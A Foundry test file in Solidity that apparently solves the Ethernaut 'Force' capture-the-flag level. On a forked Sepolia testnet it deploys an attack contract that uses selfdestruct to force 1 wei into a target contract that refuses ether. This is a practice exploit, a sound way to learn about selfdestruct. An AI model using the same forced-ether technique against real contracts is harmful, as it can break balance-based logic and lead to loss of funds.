// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../src/Force.sol";

contract Level6 is Test {
    Force force = Force(payable(0x5EBcc1A7351B0e2676A8C0d10eCdf5bDeeA8eDe5));
    address attacker = 0x8c9D2Ed582846497b454cAFA67160F679AF90A2f;

    function setUp() public {
        vm.createSelectFork(vm.rpcUrl("sepolia"), 4547463);
        vm.startPrank(attacker);
    }

    function testLevel7() public {
        AttackContract attackContract = new AttackContract{value: 1 wei}();
        attackContract.pwn();
        require(address(force).balance >= 1 wei);
    }
}

contract AttackContract {
    Force force = Force(payable(0x5EBcc1A7351B0e2676A8C0d10eCdf5bDeeA8eDe5));

    constructor() payable {}

    function pwn() public payable {
        selfdestruct(payable(address(force)));
    }

    receive() external payable {}
}
